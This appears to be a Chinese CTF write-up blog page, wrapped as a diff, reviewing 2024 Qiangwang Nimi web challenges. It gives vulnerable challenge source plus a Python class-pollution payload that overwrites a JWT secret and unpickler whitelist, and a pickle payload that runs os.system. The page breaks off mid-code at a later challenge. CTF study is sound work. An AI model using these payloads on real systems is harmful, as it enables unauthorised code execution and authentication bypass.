@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/xxx/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="web复盘一下吧只做出来了两道，所有题都有一点思路，但是只有一点点可惜可惜，太可惜了。 capoo这是个非预期，capoo.php可以任意文件读取，能读取到start.sh,start.sh中泄露了flag的名字，直接读取就行 ez_picker12345678910111213141516171819202122232425262728293031323334353637383940414243">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024强网拟态复盘">
+<meta property="og:url" content="http://example.com/2024/10/21/2024%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%A4%8D%E7%9B%98/index.html">
+<meta property="og:site_name" content="lvzhouhang">
+<meta property="og:description" content="web复盘一下吧只做出来了两道，所有题都有一点思路，但是只有一点点可惜可惜，太可惜了。 capoo这是个非预期，capoo.php可以任意文件读取，能读取到start.sh,start.sh中泄露了flag的名字，直接读取就行 ez_picker12345678910111213141516171819202122232425262728293031323334353637383940414243">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-10-21T07:27:08.000Z">
+<meta property="article:modified_time" content="2024-10-22T06:16:51.176Z">
+<meta property="article:author" content="吕宙航">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2024/10/21/2024%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%A4%8D%E7%9B%98/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2024强网拟态复盘 | lvzhouhang</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/clicklove.js"></script>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lvzhouhang</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/21/2024%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%A4%8D%E7%9B%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="吕宙航">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2024强网拟态复盘
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-10-21 15:27:08" itemprop="dateCreated datePublished" datetime="2024-10-21T15:27:08+08:00">2024-10-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-10-22 14:16:51" itemprop="dateModified" datetime="2024-10-22T14:16:51+08:00">2024-10-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/%E5%A4%8D%E7%9B%98/" itemprop="url" rel="index"><span itemprop="name">复盘</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>20k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>18 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>web复盘一下吧只做出来了两道，所有题都有一点思路，但是只有一点点可惜可惜，太可惜了。</p>
+<h1 id="capoo"><a href="#capoo" class="headerlink" title="capoo"></a>capoo</h1><p>这是个非预期，capoo.php可以任意文件读取，能读取到start.sh,start.sh中泄露了flag的名字，直接读取就行</p>
+<h1 id="ez-picker"><a href="#ez-picker" class="headerlink" title="ez_picker"></a>ez_picker</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#源码</span></span><br><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> json,file <span class="keyword">as</span> file_,text,redirect</span><br><span class="line"><span class="keyword">from</span> sanic_cors <span class="keyword">import</span> CORS</span><br><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> secret_key</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line">app = Sanic(<span class="string">&quot;App&quot;</span>)</span><br><span class="line">pickle_file = <span class="string">&quot;data.pkl&quot;</span></span><br><span class="line">my_object = &#123;&#125;</span><br><span class="line">users = []</span><br><span class="line"></span><br><span class="line">safe_modules = &#123;</span><br><span class="line">    <span class="string">&#x27;math&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;datetime&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;collections&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">safe_names = &#123;</span><br><span class="line">    <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;timedelta&#x27;</span>, <span class="string">&#x27;timezone&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;loads&#x27;</span>, <span class="string">&#x27;dumps&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;namedtuple&#x27;</span>, <span class="string">&#x27;deque&#x27;</span>, <span class="string">&#x27;Counter&#x27;</span>, <span class="string">&#x27;defaultdict&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> safe_modules <span class="keyword">and</span> name <span class="keyword">in</span> safe_names:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %(module, name))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">CORS(app, supports_credentials=<span class="literal">True</span>, origins=[<span class="string">&quot;http://localhost:8000&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000&quot;</span>])</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,username,password</span>):</span><br><span class="line">        self.username=username</span><br><span class="line">        self.password=password</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token_required</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">request, *args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&quot;token&quot;</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result=jwt.decode(token, <span class="built_in">str</span>(secret_key), algorithms=[<span class="string">&#x27;HS256&#x27;</span>], options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">True</span>&#125;)</span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Token expired&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid token&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&quot;role&quot;</span>]!=<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Permission Denied&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> func(request, *args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_reader</span>(<span class="params">request</span>):</span><br><span class="line">    file = <span class="string">&quot;app.py&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> text(content)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@token_required</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/upload.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;No file provided&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    file = request.files.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    file_object = file[<span class="number">0</span>] <span class="keyword">if</span> <span class="built_in">isinstance</span>(file, <span class="built_in">list</span>) <span class="keyword">else</span> file</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        new_data = restricted_loads(file_object.body)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            my_object.update(new_data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Pickle object loaded but not updated&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(pickle_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pickle.dump(my_object, f)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Pickle object updated&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span> pickle.UnpicklingError:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;Dangerous pickle file&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/register.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.json:</span><br><span class="line">        NewUser=User(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;password&quot;</span>)</span><br><span class="line">        merge(request.json, NewUser)</span><br><span class="line">        users.append(NewUser)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">    <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Register Success!&quot;</span>,<span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;/login&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.json:</span><br><span class="line">        username = request.json.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password = request.json.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Username or password missing&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">        user = <span class="built_in">next</span>((u <span class="keyword">for</span> u <span class="keyword">in</span> users <span class="keyword">if</span> u.username == username), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            <span class="keyword">if</span> user.password == password:</span><br><span class="line">                data=&#123;<span class="string">&quot;user&quot;</span>:username,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">                data[<span class="string">&#x27;exp&#x27;</span>] = <span class="built_in">int</span>(time.time()) + <span class="number">60</span> *<span class="number">5</span></span><br><span class="line">                token = jwt.encode(data, <span class="built_in">str</span>(secret_key), algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">                response = json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;/upload&quot;</span>&#125;)</span><br><span class="line">                response.cookies[<span class="string">&quot;token&quot;</span>]=token</span><br><span class="line">                response.headers[<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>] = request.headers.get(<span class="string">&#x27;origin&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid password&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;User not found&quot;</span>&#125;, status=<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>考点就是原型链污染+pickle反序列化+jwt伪造，我当时感觉最难的是那个pickle反序列化，因为他是白名单虽然可以通过原型链污染进行修改但是这是由于对原理以及内建模块的不熟悉导致的，其实只需要把用到的模块和命令加入就行比如<code>builtins</code>、<code>getattr</code>、<code>popen</code>加入就好了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#污染链</span></span><br><span class="line">&#123;<span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;secret_key&quot;</span>:<span class="string">&quot;66666&quot;</span>,</span><br><span class="line">            <span class="string">&quot;safe_modules&quot;</span>:[<span class="string">&quot;os&quot;</span>],</span><br><span class="line">            <span class="string">&quot;safe_names&quot;</span>:[<span class="string">&quot;eval&quot;</span>],</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pickle链</span></span><br><span class="line"><span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">eval</span></span><br><span class="line"><span class="string">S&#x27;os.system(\&quot;calc\&quot;)&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Spreader"><a href="#Spreader" class="headerlink" title="Spreader"></a>Spreader</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># app.<span class="property">js</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span 